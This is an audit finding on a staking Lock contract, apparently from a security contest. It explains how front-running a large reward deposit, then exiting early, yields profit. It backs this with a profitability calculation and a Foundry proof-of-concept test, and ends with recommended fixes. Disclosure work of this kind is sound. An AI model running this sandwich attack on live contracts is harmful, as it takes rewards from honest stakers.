# [H-02] Depositing Rewards is Worth Front Running if the Deposit Value Exceeds Certain Threshold of the Locked Amount

## Summary 
Though it doesn't have a high probability, if the value of the rewards being deposited to the Lock contract is higher than a certain Threshold of `lockedSupplyWithMultiplier` (50% if the penalty is 50%), it's possible to perform a profitable sandwich attack on the `deposit transaction` or `notifyUnseenReward` function call ([Link to Code](https://github.com/sherlock-audit/2024-05-gamma-staking/blob/main/StakingV2/src/Lock.sol#L504)), by staking into the lock contract before the reward transaction and exiting early after it. 

## Vulnerability Detail
For example, if the `lockedSupplyWithMultiplier` is worth $1000 and the reward being deposited is worth $550, assuming a 50% loss on early exit, the needed deposit (x) from the attacker in order to profit can be calculated as below:
```javascript
[ Loss on exit = -x/2 ] 
[ Profit = 550 * x/(1000+x) ]

Adding these two, we will have: 
[ 550x/(1000+x) - x/2 > 0 ]

First, multiply every term by (2(1000+x)) to clear the fractions:
[ -x(1000+x) + 1100x > 0 ]

Expand and simplify:
[ -1000x - x^2 + 1100x > 0 ]

Combine like terms:
[ -x^2 + 100x > 0 ]

Divide every term by (x) (assuming (x \neq 0)):
[ -x + 100 > 0 ]

Rearrange the inequality:
[ x < 100 ]
```
So, if the deposit amount is less than 100 (`x < 100`), the sandwich attack will succeed. Note that with a lower percentage of penalties, this value will alter significantly. For example, if the penalty ratio is at 25 percent, the rewards only need to be a quarter of the pool in order for this scheme to be profitable.

## Impact
An attacker using this method can reduce the profit of other honest users (by 10 percent in the example above).

## Code Snippet
To prove this issue, add this test to `Deposit.t.sol` test suite:
In this test for calculation simplicity, it is assumed that staking and rewarding tokens are both worth the same.
```javascript 
    function testFrontrunningRewards() public {
        // Simulating deposits by user1 different users
        vm.prank(user1);
        lock.stake(1000e18, user1, 0);
        // user 2 seeing the deposited rewards below frontruns it, 
        // or he can even frontrun the notifyUnseenRewards function call
        vm.prank(user2);
        lock.stake(100e18, user2, 0);
        // Distributing rewards to the staking contract
        vm.prank(deployer);
        _rewardToken.transfer(address(lock), 600e18);
        vm.prank(deployer);
        lock.notifyUnseenReward(rewardTokens);
        // user 2 gets the rewards and earlyexits the position in profit
        vm.startPrank(user2);
        lock.getAllRewards();
        LockedBalance memory lockedBalance = lock.locklist().getLock(user2, 0);
        lock.earlyExitById(lockedBalance.lockId);

        console.log("value of portfolio");
        console.log(
            _stakingToken.balanceOf(user2) + _rewardToken.balanceOf(user2)
        ); //1004_545_454_545_454_545_454 => 4.54 dollar profit on 100 dollar investment
        assert(
            _rewardToken.balanceOf(user2) + _stakingToken.balanceOf(user2) >
                1000e18
        ); //assuming reward and stake token both have same value for simplicity
    }
```
## Tool used

Manual Review

## Recommendation
1. In case of large rewards, the deposits can be done in chunks to ignore this problem, especially when the penalty is lower than 50%.
2. Another way to fix this issue can be using pause and unpause functions before and after depositing rewards to stop anyone from adding stakes during this period.
